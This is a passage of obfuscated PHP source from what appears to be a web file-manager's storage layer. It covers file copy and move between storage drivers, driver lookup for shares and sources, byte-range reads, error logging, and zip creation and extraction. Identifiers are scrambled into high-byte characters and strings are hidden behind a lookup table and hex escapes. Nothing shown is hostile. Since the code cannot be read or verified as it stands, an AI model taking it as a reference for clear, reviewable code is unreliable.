$‹ó¾³š£[85] => array()); $ûˆöòö» = array_merge($¢ÁÛ§¡”[$‹ó¾³š£[86]], $¢ÁÛ§¡”[$‹ó¾³š£[85]]); foreach ($ûˆöòö» as $é…Ñ¨¶Ò) { $è¦ÅÆ¡ß = $é…Ñ¨¶Ò[$‹ó¾³š£[33]] == $‹ó¾³š£[230]; $¹†Ë²È = $¤Ÿİ›¼°->getPathInner($é…Ñ¨¶Ò[$‹ó¾³š£[87]]); $üüãÑ¯è = self::copyPath($¤Ÿİ›¼°, $¹†Ë²È, $¦äÅ€®ª, $¦§Şò‡İ, $¯êúÇš, $î¨•ËÅˆ, $è¦ÅÆ¡ß, !1, !1); if (!$üüãÑ¯è) { IO::errorTips($‹ó¾³š£[1250] . $¹†Ë²È . $‹ó¾³š£[73] . $¦§Şò‡İ); } } self::copyMoveKeepInfo($¤Ÿİ›¼°, $¹†Ë²È, $›—µûÉì); return $›—µûÉì; } private static function copyFile($‡ô¦ºÏ, $·ÇÁ£í¼, $õ—²ˆ¡«, $¬æ“»Ÿç, $‰‡ë™Â, $Šë ñ‹ì) { $Éİ½¹ñ¸ =& $_SERVER[Ùæõ‰Ï’]; $¬æ“»Ÿç = $õ—²ˆ¡«->getPath(rtrim($¬æ“»Ÿç, $Éİ½¹ñ¸[8]) . $Éİ½¹ñ¸[8] . $‰‡ë™Â); $Ü«™¾°™ = $Éİ½¹ñ¸[1251] . time() . rand_string(5); Hook::trigger($Éİ½¹ñ¸[1252], $‡ô¦ºÏ, $·ÇÁ£í¼, $õ—²ˆ¡«, $¬æ“»Ÿç, $‰‡ë™Â, $Ü«™¾°™); if (self::driverIsSame($‡ô¦ºÏ, $õ—²ˆ¡«)) { if ($Šë ñ‹ì) { $°³Ô«« = $õ—²ˆ¡«->moveFile($·ÇÁ£í¼, $¬æ“»Ÿç); } else { $°³Ô«« = $õ—²ˆ¡«->copyFile($·ÇÁ£í¼, $¬æ“»Ÿç); } Hook::trigger($Éİ½¹ñ¸[1253], $‡ô¦ºÏ, $·ÇÁ£í¼, $õ—²ˆ¡«, $¬æ“»Ÿç, $‰‡ë™Â, $°³Ô««); self::copyMoveKeepInfo($‡ô¦ºÏ, $·ÇÁ£í¼, $°³Ô««); return $°³Ô««; } $º„¯ÈÅÅ = TEMP_FILES; if ($GLOBALS[$Éİ½¹ñ¸[6]][$Éİ½¹ñ¸[92]][$Éİ½¹ñ¸[879]]) { $º„¯ÈÅÅ = $GLOBALS[$Éİ½¹ñ¸[6]][$Éİ½¹ñ¸[92]][$Éİ½¹ñ¸[879]]; } $Şè‡Áè = $º„¯ÈÅÅ; mk_dir($Şè‡Áè); $Û‰å¥å = $Şè‡Áè . $Ü«™¾°™; $„Ÿ¤Ù˜¸ = $Û‰å¥å; $Û‰å¥å = $‡ô¦ºÏ->download($·ÇÁ£í¼, $Û‰å¥å); $Û‰å¥å = $‡ô¦ºÏ->iconvApp($Û‰å¥å); if (substr($Û‰å¥å, strlen($º„¯ÈÅÅ)) == $º„¯ÈÅÅ) { $Šë ñ‹ì = !0; } $°³Ô«« = $õ—²ˆ¡«->upload($¬æ“»Ÿç, $Û‰å¥å, $Šë ñ‹ì); self::remove($„Ÿ¤Ù˜¸); Hook::trigger($Éİ½¹ñ¸[1253], $‡ô¦ºÏ, $·ÇÁ£í¼, $õ—²ˆ¡«, $¬æ“»Ÿç, $‰‡ë™Â, $°³Ô««); self::copyMoveKeepInfo($‡ô¦ºÏ, $·ÇÁ£í¼, $°³Ô««); return $°³Ô««; } private static function copyMoveKeepInfo($ìÊ´æˆç, $ùáğ¤Ê, $¿­úº±) { if (!$¿­úº±) { return; } $…ŠéÑÃà = $ìÊ´æˆç->info($ùáğ¤Ê); if (!is_array($…ŠéÑÃà)) { return; } IO::setModifyTime($¿­úº±, $…ŠéÑÃà[$_SERVER[Ùæõ‰Ï’][88]]); } public static function pathFather($š‚ËåÕÛ) { $›Ìöˆ—­ = IO::init($š‚ËåÕÛ); $Ò°›Çı = $›Ìöˆ—­->pathFather($›Ìöˆ—­->path); return $›Ìöˆ—­->getPathOuter($Ò°›Çı); } public static function fileOut($Àµó¯ˆê, $Ÿæ¡İ¨ = false, $¶ˆÕé‹® = false, $Àß€ïøˆ = '') { $ÆÔà¨ÁÛ = self::driverMake($Àµó¯ˆê); if ($ÆÔà¨ÁÛ->isFileOutServer()) { return $ÆÔà¨ÁÛ->fileOutServer($Àµó¯ˆê, $Ÿæ¡İ¨, $¶ˆÕé‹®, $Àß€ïøˆ); } return $ÆÔà¨ÁÛ->fileOut($Àµó¯ˆê, $Ÿæ¡İ¨, $¶ˆÕé‹®, $Àß€ïøˆ); } public static function fileOutImage($‚¼˜Ô±×, $ú•Æ®¶ä = 250) { $˜®š»“² = array(250, 600, 1200, 2000, 3000, 5000); for ($Ü›ÇÚ–º = 0; $Ü›ÇÚ–º < count($˜®š»“²); $Ü›ÇÚ–º++) { if ($Ü›ÇÚ–º == 0 && $ú•Æ®¶ä <= $˜®š»“²[$Ü›ÇÚ–º]) { $ú•Æ®¶ä = $˜®š»“²[$Ü›ÇÚ–º]; break; } else { if ($ú•Æ®¶ä > $˜®š»“²[$Ü›ÇÚ–º - 1] && $ú•Æ®¶ä <= $˜®š»“²[$Ü›ÇÚ–º]) { $ú•Æ®¶ä = $˜®š»“²[$Ü›ÇÚ–º]; break; } else { if ($Ü›ÇÚ–º == count($˜®š»“²) - 1 && $ú•Æ®¶ä > $˜®š»“²[$Ü›ÇÚ–º]) { $ú•Æ®¶ä = $˜®š»“²[$Ü›ÇÚ–º]; break; } } } } $“íŠ…ùÕ = self::driverMake($‚¼˜Ô±×); if ($“íŠ…ùÕ->isFileOutServer()) { return $“íŠ…ùÕ->fileOutImageServer($‚¼˜Ô±×, $ú•Æ®¶ä); } return $“íŠ…ùÕ->fileOutImage($‚¼˜Ô±×, $ú•Æ®¶ä); } private static function driverIsSame($×ùª×¥æ, $É†Ï€©Å) { $¯ÉäØ±ã =& $_SERVER[Ùæõ‰Ï’]; $ºÛæ­Éğ = $×ùª×¥æ->getType(); $Š†®©şş = $É†Ï€©Å->getType(); if ($ºÛæ­Éğ != $Š†®©şş) { return !1; } if ($ºÛæ­Éğ == $¯ÉäØ±ã[840]) { return !0; } if ($ºÛæ­Éğ == $¯ÉäØ±ã[109]) { return !0; } if ($×ùª×¥æ->pathDriver == $É†Ï€©Å->pathDriver) { return !0; } return !1; } public static function copyUpdate($‚Ä¹Ğ²É, $Î°Ç”Ñ) { $î¥Í›ƒÑ =& $_SERVER[Ùæõ‰Ï’]; if (!IO::exist($‚Ä¹Ğ²É)) { return !1; } if (!IO::exist($Î°Ç”Ñ)) { IO::mkdir($Î°Ç”Ñ); } $İ°ğ§©Ä = array_to_keyvalue(self::listAllSimple($‚Ä¹Ğ²É), $î¥Í›ƒÑ[87]); $…˜±¨â = array_to_keyvalue(self::listAllSimple($Î°Ç”Ñ), $î¥Í›ƒÑ[87]); $ô›ôå½Å = array(); $€£‚”æ = array(); foreach ($İ°ğ§©Ä as $»ı‰—·¢ => $«£§ò–) { if (isset($…˜±¨â[$»ı‰—·¢])) { if ($«£§ò–[$î¥Í›ƒÑ[78]] == 1) { continue; } if ($…˜±¨â[$»ı‰—·¢][$î¥Í›ƒÑ[79]] == $«£§ò–[$î¥Í›ƒÑ[79]]) { continue; } } if ($«£§ò–[$î¥Í›ƒÑ[78]] == 1) { $€£‚”æ[] = $Î°Ç”Ñ . $î¥Í›ƒÑ[8] . trim($»ı‰—·¢, $î¥Í›ƒÑ[8]); continue; } $Ôº™Åû× = strstr(trim($»ı‰—·¢, $î¥Í›ƒÑ[8]), $î¥Í›ƒÑ[8]) ? get_path_father($»ı‰—·¢) : $î¥Í›ƒÑ[12]; $ô›ôå½Å[] = array($î¥Í›ƒÑ[1254] => $«£§ò–[$î¥Í›ƒÑ[89]], $î¥Í›ƒÑ[1255] => rtrim($Î°Ç”Ñ, $î¥Í›ƒÑ[8]) . $î¥Í›ƒÑ[8] . $Ôº™Åû×, $î¥Í›ƒÑ[1256] => $«£§ò–); } $öƒ±üÛÕ = array($î¥Í›ƒÑ[230] => $ô›ôå½Å, $î¥Í›ƒÑ[78] => $€£‚”æ); Hook::trigger($î¥Í›ƒÑ[1257], $‚Ä¹Ğ²É, $Î°Ç”Ñ, $öƒ±üÛÕ); foreach ($€£‚”æ as $«£§ò–) { IO::mkdir($«£§ò–); } foreach ($ô›ôå½Å as $«£§ò–) { IO::copy($«£§ò–[$î¥Í›ƒÑ[1254]], $«£§ò–[$î¥Í›ƒÑ[1255]], REPEAT_REPLACE); } } public static function fileSubstr($À¶êıÁ¤, $Ü ÒøŠÊ, $úÓºÉİ½ = false) { $„Ç¨½¤ =& $_SERVER[Ùæõ‰Ï’]; $çÅ‘ŠÒ = self::driverMake($À¶êıÁ¤); $°·Â¡ïÕ = $çÅ‘ŠÒ->size($À¶êıÁ¤); $Íé‘É = $Ü ÒøŠÊ; $›ùÑÁ‘Š = $úÓºÉİ½; if ($Ü ÒøŠÊ < 0) { $Ü ÒøŠÊ = $°·Â¡ïÕ + $Ü ÒøŠÊ; } if ($úÓºÉİ½ === !1) { $úÓºÉİ½ = $°·Â¡ïÕ - $Ü ÒøŠÊ; } if ($Ü ÒøŠÊ + $úÓºÉİ½ > $°·Â¡ïÕ) { $úÓºÉİ½ = $°·Â¡ïÕ - $Ü ÒøŠÊ; } if (!$°·Â¡ïÕ && $çÅ‘ŠÒ->getType() == $„Ç¨½¤[109] && !$çÅ‘ŠÒ->exist($À¶êıÁ¤)) { $ÁË³ãÛ‡ = get_path_this($À¶êıÁ¤); $³î¾íËŠ = parse_url_query($ÁË³ãÛ‡); if (is_array($³î¾íËŠ) && isset($³î¾íËŠ[$„Ç¨½¤[32]])) { $ÁË³ãÛ‡ = urldecode($³î¾íËŠ[$„Ç¨½¤[32]]); } throw new Exception($„Ç¨½¤[1258] . LNG($„Ç¨½¤[1259]) . $„Ç¨½¤[1057] . clear_html($ÁË³ãÛ‡) . $„Ç¨½¤[12]); } if ($úÓºÉİ½ <= 0) { return $„Ç¨½¤[12]; } if ($Ü ÒøŠÊ < 0 || $Ü ÒøŠÊ >= $°·Â¡ïÕ || $úÓºÉİ½ > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\x65\x52\x65\141\x64\x20\x65\162\162\157\x72\41\x20\x73\x74\141\x72\x74\75{$Ü ÒøŠÊ}\73\x6c\x65\x6e\147\x74\x68\75{$úÓºÉİ½}\73\x20\163\151\172\145\x3d{$°·Â¡ïÕ}\x3b"); } $‘ù±İÎ¤ = $çÅ‘ŠÒ->fileSubstr($À¶êıÁ¤, $Ü ÒøŠÊ, $úÓºÉİ½); if (!$‘ù±İÎ¤ && $úÓºÉİ½ && isset($GLOBALS[$„Ç¨½¤[1260]])) { throw new Exception($GLOBALS[$„Ç¨½¤[1260]][$„Ç¨½¤[1261]]); } return $‘ù±İÎ¤; } private static function driverMake(&$Å¾½ÆòÖ) { $˜÷¯ˆ¯ =& $_SERVER[Ùæõ‰Ï’]; $õ¶íˆêš = KodIO::parse($Å¾½ÆòÖ); if (!self::$driverListSystem) { $À°£—´ = Model($˜÷¯ˆ¯[850])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($À°£—´, $˜÷¯ˆ¯[475]); } if ($õ¶íˆêš[$˜÷¯ˆ¯[33]] == KodIO::KOD_IO && !self::$driverListSystem[$õ¶íˆêš[$˜÷¯ˆ¯[475]]]) { throw new Exception($˜÷¯ˆ¯[1262]); return !1; } $Å¾½ÆòÖ = $õ¶íˆêš[$˜÷¯ˆ¯[1263]]; $…ûÌÇ² = self::driverGet($õ¶íˆêš, $Å¾½ÆòÖ); return $…ûÌÇ²; } private static function driverGet($ó€ëœáà, &$ÅŞ²ë—÷) { $âóª–ö =& $_SERVER[Ùæõ‰Ï’]; $É˜¤»À = $ó€ëœáà[$âóª–ö[1264]]; $ ¾Ñ’´ı = $ó€ëœáà[$âóª–ö[475]]; switch ($ó€ëœáà[$âóª–ö[33]]) { case KodIO::KOD_IO: $á³ÑÜ£¼ = self::$driverListSystem[$ ¾Ñ’´ı]; break; case KodIO::KOD_SOURCE: $ÅŞ²ë—÷ = $ ¾Ñ’´ı . $ÅŞ²ë—÷; $á³ÑÜ£¼ = array($âóª–ö[1265] => $âóª–ö[1266], $âóª–ö[6] => $ó€ëœáà); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $È¬ìâÈ = $GLOBALS[$âóª–ö[1267]]; self::$driverListUser = array_to_keyvalue($È¬ìâÈ, $âóª–ö[475]); } $á³ÑÜ£¼ = self::$driverListUser[$ ¾Ñ’´ı]; break; case KodIO::KOD_SHARE_LINK: $á³ÑÜ£¼ = array($âóª–ö[1265] => $âóª–ö[1268], $âóª–ö[6] => $ó€ëœáà); $ªÀ‹ç¦ü = Action($âóª–ö[1269])->sharePathInfo($ó€ëœáà[$âóª–ö[87]]); $ÅŞ²ë—÷ = $ªÀ‹ç¦ü[$âóª–ö[193]]; if (!$ªÀ‹ç¦ü[$âóª–ö[193]]) { $ÆÀ€ì©¢ = Model($âóª–ö[664])->getInfo($ªÀ‹ç¦ü[$âóª–ö[665]]); $ÅŞ²ë—÷ = KodIO::clear($ÆÀ€ì©¢[$âóª–ö[1270]] . $ó€ëœáà[$âóª–ö[1263]]); $ó€ëœáà[$âóª–ö[560]] = $ÆÀ€ì©¢; $ó€ëœáà[$âóª–ö[1245]] = $ÅŞ²ë—÷; $á³ÑÜ£¼ = array($âóª–ö[1265] => $âóª–ö[1271], $âóª–ö[6] => $ó€ëœáà); } break; case KodIO::KOD_SHARE_ITEM: $á³ÑÜ£¼ = array($âóª–ö[1265] => $âóª–ö[1272], $âóª–ö[6] => $ó€ëœáà); $ÆÀ€ì©¢ = Model($âóª–ö[664])->getInfo($ó€ëœáà[$âóª–ö[475]]); if ($ÆÀ€ì©¢[$âóª–ö[193]] == $âóª–ö[228]) { $ÅŞ²ë—÷ = KodIO::clear($ÆÀ€ì©¢[$âóª–ö[1270]] . $ó€ëœáà[$âóª–ö[1263]]); $ó€ëœáà[$âóª–ö[560]] = $ÆÀ€ì©¢; $ó€ëœáà[$âóª–ö[1245]] = $ÅŞ²ë—÷; $á³ÑÜ£¼ = array($âóª–ö[1265] => $âóª–ö[1273], $âóª–ö[6] => $ó€ëœáà); } else { if (!$ÅŞ²ë—÷) { $ÅŞ²ë—÷ = $ÆÀ€ì©¢[$âóª–ö[193]]; } } break; default: $ÅŞ²ë—÷ = $ó€ëœáà[$âóª–ö[87]]; $á³ÑÜ£¼ = array($âóª–ö[1265] => $âóª–ö[1274]); break; } $ÉÉ™¬˜ = $ó€ëœáà[$âóª–ö[87]]; if (!isset(self::$driverCache[$ÉÉ™¬˜])) { $ÙœÙ¹ÒÂ = strtolower($á³ÑÜ£¼[$âóª–ö[98]]); $¯ÍÎû³ = $GLOBALS[$âóª–ö[6]][$âóª–ö[92]][$âóª–ö[908]]; $ö±°ª¯ñ = $âóª–ö[77] . (isset($¯ÍÎû³[$ÙœÙ¹ÒÂ]) ? $¯ÍÎû³[$ÙœÙ¹ÒÂ] : ucfirst($ÙœÙ¹ÒÂ)); if (!class_exists($ö±°ª¯ñ)) { show_json("{$ö±°ª¯ñ}\40\x6e\x6f\x74\40\x65\170\151\163\164\x73\41", !1); } $Ìü‹öÚŠ = isset($á³ÑÜ£¼[$âóª–ö[6]]) ? $á³ÑÜ£¼[$âóª–ö[6]] : !1; self::$driverCache[$ÉÉ™¬˜] = new $ö±°ª¯ñ($Ìü‹öÚŠ); } $¬¬ÓÔ  = self::$driverCache[$ÉÉ™¬˜]; $¬¬ÓÔ ->pathDriver = $É˜¤»À; $¬¬ÓÔ ->pathBase = $âóª–ö[12]; if (isset($á³ÑÜ£¼[$âóª–ö[6]][$âóª–ö[1275]])) { $¬¬ÓÔ ->pathBase = rtrim($á³ÑÜ£¼[$âóª–ö[6]][$âóª–ö[1275]], $âóª–ö[8]) . $âóª–ö[8]; $ÅŞ²ë—÷ = $¬¬ÓÔ ->pathBase . ltrim($ÅŞ²ë—÷, $âóª–ö[8]); } $ÅŞ²ë—÷ = $¬¬ÓÔ ->getPath($ÅŞ²ë—÷); if (isset($ó€ëœáà[$âóª–ö[1245]])) { $ÅŞ²ë—÷ = $ó€ëœáà[$âóª–ö[1245]]; } $¬¬ÓÔ ->path = $ÅŞ²ë—÷; return $¬¬ÓÔ ; } public static function errorTips($×ãçÕêŞ = false) { $‡È‰ÎÌ =& $_SERVER[Ùæõ‰Ï’]; static $ôŞÀà¸ˆ = array(); $»ìò¿Ñƒ = 1000; if ($×ãçÕêŞ === -1) { return $ôŞÀà¸ˆ ? $ôŞÀà¸ˆ[count($ôŞÀà¸ˆ) - 1] : $‡È‰ÎÌ[12]; } if ($×ãçÕêŞ === !1) { return implode($‡È‰ÎÌ[262], $ôŞÀà¸ˆ); } if (count($ôŞÀà¸ˆ) >= $»ìò¿Ñƒ) { $ôŞÀà¸ˆ = array_slice($ôŞÀà¸ˆ, $»ìò¿Ñƒ * 0.5, $»ìò¿Ñƒ); } $ôŞÀà¸ˆ[] = $×ãçÕêŞ; write_log($‡È‰ÎÌ[176] . ACTION . $‡È‰ÎÌ[1276] . $×ãçÕêŞ, $‡È‰ÎÌ[1277]); } public static function getLastError($„ĞˆœóÜ = '') { $ËÏ‰Ù÷ç = self::errorTips(-1); return $ËÏ‰Ù÷ç ? $ËÏ‰Ù÷ç : $„ĞˆœóÜ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¤êêß‰ã; if ($¤êêß‰ã) { return $¤êêß‰ã; } $ÂöÇù‰¿ = IO::init($_SERVER[Ùæõ‰Ï’][8]); return $ÂöÇù‰¿; } private static function iconvSystem($Ö†¸¹¸) { return self::local()->iconvSystem($Ö†¸¹¸); } private static function iconvApp($™Û²•¬ø) { return self::local()->iconvApp($™Û²•¬ø); } public static function zipFolder($»òË’˜Ã, $…ÍÌÜæ = "\172\x69\x70", $Ÿå€èæ½ = '', $¼«ıÂàÓ = REPEAT_RENAME) { $ê×”ª³° =& $_SERVER[Ùæõ‰Ï’]; $˜¯¶õ§ = IO::listPath($»òË’˜Ã); if (!$˜¯¶õ§) { return !1; } $˜¯¶õ§ = array_merge($˜¯¶õ§[$ê×”ª³°[85]], $˜¯¶õ§[$ê×”ª³°[86]]); return self::zip($˜¯¶õ§, $…ÍÌÜæ, $Ÿå€èæ½, $¼«ıÂàÓ); } public static function zip($Ëş‰Ä‡š, $À¾£²‚„ = "\x7a\x69\160", $Á¹©ş´ = '', $õ…ï‘Áš = REPEAT_RENAME) { $¢Â§”ù¬ =& $_SERVER[Ùæõ‰Ï’]; if (is_string($Ëş‰Ä‡š) && $Ëş‰Ä‡š) { $Ëş‰Ä‡š = array(array($¢Â§”ù¬[87] => $Ëş‰Ä‡š)); } $¸ëî–ÃØ = self::init($Ëş‰Ä‡š[0][$¢Â§”ù¬[87]]); $İ¤ÖÒ£ƒ = self::info($Ëş‰Ä‡š[0][$¢Â§”ù¬[87]]); $ìŠ˜çñ„ = $¢Â§”ù¬[12]; $‰¦­éç = $¢Â§”ù¬[12]; $¢œ“ß’Û = $¢Â§”ù¬[12]; if ($Á¹©ş´ && substr($Á¹©ş´, -1, 1) != $¢Â§”ù¬[8]) { $‰¦­éç = get_path_father($Á¹©ş´); $¢œ“ß’Û = get_path_this($Á¹©ş´); } else { $‰¦­éç = self::pathFather($İ¤ÖÒ£ƒ[$¢Â§”ù¬[87]]); $¢œ“ß’Û = $İ¤ÖÒ£ƒ[$¢Â§”ù¬[32]] . $¢Â§”ù¬[10] . $À¾£²‚„; if (count($Ëş‰Ä‡š) > 1) { $Ø¥ÌÑğ÷ = IO::info($‰¦­éç); $¢œ“ß’Û = $Ø¥ÌÑğ÷[$¢Â§”ù¬[32]] . $¢Â§”ù¬[10] . $À¾£²‚„; } if ($Á¹©ş´) { $‰¦­éç = $Á¹©ş´; } } if ($¸ëî–ÃØ->getType() == $¢Â§”ù¬[109]) { $Ó‰Î·§ˆ = self::init($‰¦­éç); $Ï‘¡­”ø = $Ó‰Î·§ˆ->getType() == $¢Â§”ù¬[109] ? $‰¦­éç : get_path_father($¸ëî–ÃØ->path); $Ï‘¡­”ø = rtrim($Ï‘¡­”ø, $¢Â§”ù¬[8]) . $¢Â§”ù¬[8]; mk_dir($Ï‘¡­”ø); } else { $ìŠ˜çñ„ = TEMP_FILES . $¢Â§”ù¬[1278] . time() . rand_string(8) . $¢Â§”ù¬[8]; mk_dir($ìŠ˜çñ„); file_put_contents($ìŠ˜çñ„ . $¢Â§”ù¬[1279], $¢Â§”ù¬[12]); $Ï‘¡­”ø = $ìŠ˜çñ„; } $¹¥ÛŠéÜ = IO::info($Ï‘¡­”ø); if (!$¹¥ÛŠéÜ || !$¹¥ÛŠéÜ[$¢Â§”ù¬[233]]) { show_json(LNG($¢Â§”ù¬[1280]), !1); } $şÂÉ—£è = self::zipFileList($Ëş‰Ä‡š, $ìŠ˜çñ„); foreach ($şÂÉ—£è as $Æ—ëë—ô => $¸Á¸°ãí) { $şÂÉ—£è[$Æ—ëë—ô] = self::iconvSystem($¸Á¸°ãí); } $ş••‡ = get_filename_auto($Ï‘¡­”ø . $¢œ“ß’Û, $¢Â§”ù¬[12], $õ…ï‘Áš); KodArchive::create(self::iconvSystem($ş••‡), $şÂÉ—£è); if (!IO::exist($ş••‡)) { if ($ìŠ˜çñ„) { del_dir($ìŠ˜çñ„); } write_log($¢Â§”ù¬[1281] . $ş••‡, $¢Â§”ù¬[389]); show_json(LNG($¢Â§”ù¬[1282]), !1); } if (!$ìŠ˜çñ„) { return $ş••‡; } $Ì üèÅ = self::move($ş••‡, $‰¦­éç, $õ…ï‘Áš); if ($ìŠ˜çñ„) { del_dir($ìŠ˜çñ„); } if (!$ş••‡) { write_log($¢Â§”ù¬[1283] . $ş••‡ . $¢Â§”ù¬[1284] . $‰¦­éç, $¢Â§”ù¬[389]); show_json(LNG($¢Â§”ù¬[1282]), !1); } return $Ì üèÅ; } public static function unzip($¹èÖü·È, $„¹Ö‘·£, $¼éÏŞ€Ë = "\55\61", $òÇŒÇ®Â = "\x72\x65\160\154\x61\143\145") { $ÌÕã½ÓÚ =& $_SERVER[Ùæõ‰Ï’]; $¶…ç…Ù = parent::info($¹èÖü·È); if (!$¶…ç…Ù) { show_json(LNG($ÌÕã½ÓÚ[1285]), !1); } $Õ¦ì×üƒ = IO::infoFullSimple($„¹Ö‘·£); if (!$Õ¦ì×üƒ) { $„¹Ö‘·£ = IO::mkdir($„¹Ö‘·£); } if (isset($Õ¦ì×üƒ[$ÌÕã½ÓÚ[193]]) && trim($Õ¦ì×üƒ[$ÌÕã½ÓÚ[87]], $ÌÕã½ÓÚ[8]) != trim($„¹Ö‘·£, $ÌÕã½ÓÚ[8])) { $Òç•ı¼ = KodIO::make($Õ¦ì×üƒ[$ÌÕã½ÓÚ[192]]); $·ˆ¥õù» = IO::fileNameAuto($Òç•ı¼, $Õ¦ì×üƒ[$ÌÕã½ÓÚ[32]], REPEAT_RENAME_FOLDER, !0); $„¹Ö‘·£ = IO::mkdir($Òç•ı¼ . $·ˆ¥õù»); } $¼éÏŞ€Ë = $¼éÏŞ€Ë && $¼éÏŞ€Ë != $ÌÕã½ÓÚ[1286] ? @json_decode($¼éÏŞ€Ë, !0) : -1; $ÛÓçÜô€ = self::unzipPart($¹èÖü·È, $¼éÏŞ€Ë); if (!$ÛÓçÜô€ || !IO::exist($ÛÓçÜô€[$ÌÕã½ÓÚ[230]])) { show_json(LNG($ÌÕã½ÓÚ[108]), !1); } $ôÜ€ÓÒ— = $ÛÓçÜô€[$ÌÕã½ÓÚ[1287]][count($ÛÓçÜô€[$ÌÕã½ÓÚ[1287]]) - 1]; if ($ôÜ€ÓÒ—[$ÌÕã½ÓÚ[1288]] == -1 || substr($ôÜ€ÓÒ—[$ÌÕã½ÓÚ[32]], -1, 1) == $ÌÕã½ÓÚ[8]) { $©Ÿ×Å± = $ÛÓçÜô€[$ÌÕã½ÓÚ[1289]] . rand_string(10) . $ÌÕã½ÓÚ[8]; mk_dir($©Ÿ×Å±); $õ¡Œ¤É = count($ÛÓçÜô€[$ÌÕã½ÓÚ[1287]]) == 1 ? IO::ext($¹èÖü·È) : get_path_ext($ÛÓçÜô€[$ÌÕã½ÓÚ[230]]); $³­ò½ = KodArchive::extract(self::iconvSystem($ÛÓçÜô€[$ÌÕã½ÓÚ[230]]), $©Ÿ×Å±, $ôÜ€ÓÒ—[$ÌÕã½ÓÚ[1288]], $·ˆ¥õù», $õ¡Œ¤É); self::unzipErrorCheck($³­ò½, array($ÌÕã½ÓÚ[1290], $¹èÖü·È, $õ¡Œ¤É, $„¹Ö‘·£, $ÛÓçÜô€)); Hook::trigger($ÌÕã½ÓÚ[1291], $©Ÿ×Å±); recursion_dir($©Ÿ×Å±, $ğ»µêĞ, $öäúáä—, 0); $ğÏ’Šğ¶ = array_merge($ğ»µêĞ, $öäúáä—); $­¯¦›¡Ô = array(); foreach ($ğÏ’Šğ¶ as $“÷æğÃî) { $¼ÁÒóïŒ = IO::move(self::iconvApp($“÷æğÃî), $„¹Ö‘·£, $òÇŒÇ®Â); if ($¼ÁÒóïŒ) { $­¯¦›¡Ô[] = $¼ÁÒóïŒ; } } del_dir($©Ÿ×Å±); } else { $¼ÁÒóïŒ = IO::move($ÛÓçÜô€[$ÌÕã½ÓÚ[230]], $„¹Ö‘·£, $òÇŒÇ®Â, get_path_this($ôÜ€ÓÒ—[$ÌÕã½ÓÚ[32]])); if ($¼ÁÒóïŒ) { $­¯¦›¡Ô[] = $¼ÁÒóïŒ; } } return $­¯¦›¡Ô ? $­¯¦›¡Ô : !1; } public static function unzipList($Ÿ¹òÑ¦˜) { $…Š¶š’Ç =& $_SERVER[Ùæõ‰Ï’]; $öá§…Áê = isset($Ÿ¹òÑ¦˜[$…Š¶š’Ç[1292]]) ? $Ÿ¹òÑ¦˜[$…Š¶š’Ç[1292]] : !1; $¡«°ÂëÅ = isset($Ÿ¹òÑ¦˜[$…Š¶š’Ç[1288]]) ? @json_decode($Ÿ¹òÑ¦˜[$…Š¶š’Ç[1288]], !0) : -1; $…¦æäÕŠ = self::unzipPart($Ÿ¹òÑ¦˜[$…Š¶š’Ç[87]], $¡«°ÂëÅ); if (!$…¦æäÕŠ || !IO::exist($…¦æäÕŠ[$…Š¶š’Ç[230]])) { show_json(LNG($…Š¶š’Ç[108]), !1); } $İÑ¯ãçÎ = $…¦æäÕŠ[$…Š¶š’Ç[1287]][count($…¦æäÕŠ[$…Š¶š’Ç[1287]]) - 1]; $¸ü¡˜Ğœ = in_array(IO::ext($…¦æäÕŠ[$…Š¶š’Ç[230]]), array($…Š¶š’Ç[389], $…Š¶š’Ç[1293], $…Š¶š’Ç[1294], $…Š¶š’Ç[1295], $…Š¶š’Ç[1296], $…Š¶š’Ç[1297])); if (!$öá§…Áê && ($İÑ¯ãçÎ[$…Š¶š’Ç[1288]] == -1 || $¸ü¡˜Ğœ)) { $ÖÈ¾ù§Û = $…¦æäÕŠ[$…Š¶š’Ç[1289]] . get_path_this($…¦æäÕŠ[$…Š¶š’Ç[230]]) . $…Š¶š’Ç[1298]; if (!IO::exist($ÖÈ¾ù§Û)) { $ª§Üœ•Ü = $İÑ¯ãçÎ[$…Š¶š’Ç[1288]] == -1 ? get_path_ext(IO::pathThis($Ÿ¹òÑ¦˜[$…Š¶š’Ç[87]])) : get_path_ext($…¦æäÕŠ[$…Š¶š’Ç[230]]); $´ÖÏ­ = KodArchive::listContent(self::iconvSystem($…¦æäÕŠ[$…Š¶š’Ç[230]]), !0, $ª§Üœ•Ü); self::unzipErrorCheck($´ÖÏ­, array($…Š¶š’Ç[1299], $Ÿ¹òÑ¦˜, $…¦æäÕŠ)); @file_put_contents($ÖÈ¾ù§Û, json_encode($´ÖÏ­[$…Š¶š’Ç[1300]])); } return @json_decode(IO::getContent($ÖÈ¾ù§Û), !0); } IO::fileOut($…¦æäÕŠ[$…Š¶š’Ç[230]], $öá§…Áê, get_path_this($İÑ¯ãçÎ[$…Š¶š’Ç[32]])); die; } private static function zipFileList($ÌÕ•¡ïÂ, $³ÒÈòÍó = false) { $”Ê÷ÆÓ =& $_SERVER[Ùæõ‰Ï’]; $ßşó•£¸ = array(); foreach ($ÌÕ•¡ïÂ as $»³ ˆ) { $€Ğ¡š = $»³ ˆ[$”Ê÷ÆÓ[87]]; if ($³ÒÈòÍó) { $€Ğ¡š = self::copy($»³ ˆ[$”Ê÷ÆÓ[87]], $³ÒÈòÍó, $”Ê÷ÆÓ[901]); } else { $×†ºÜ„î = self::init($»³ ˆ[$”Ê÷ÆÓ[87]]); if ($×†ºÜ„î->getType() == $”Ê÷ÆÓ[109]) { $€Ğ¡š = $×†ºÜ„î->path; } } if ($€Ğ¡š && self::local()->exist($€Ğ¡š)) { $ßşó•£¸[$»³ ˆ[$”Ê÷ÆÓ[87]]] = $€Ğ¡š; } } if (!empty($ßşó•£¸)) { return array_values($ßşó•£¸); } show_json(LNG($”Ê÷ÆÓ[1259]), !1); } private static function localFilePath($ĞàâËÛ) { $˜¢²¼Å² =& $_SERVER[Ùæõ‰Ï’]; $–ƒğŸø = KodIO::parse($ĞàâËÛ); if ($–ƒğŸø[$˜¢²¼Å²[33]] == KodIO::KOD_SOURCE) { $‰ëšşöƒ = Model($˜¢²¼Å²[907])->fileInfoGet(KodIO::sourceID($ĞàâËÛ)); if (!$‰ëšşöƒ[$˜¢²¼Å²[87]]) { show_json($˜¢²¼Å²[1301], !1); } $ĞàâËÛ = $‰ëšşöƒ[$˜¢²¼Å²[87]]; } 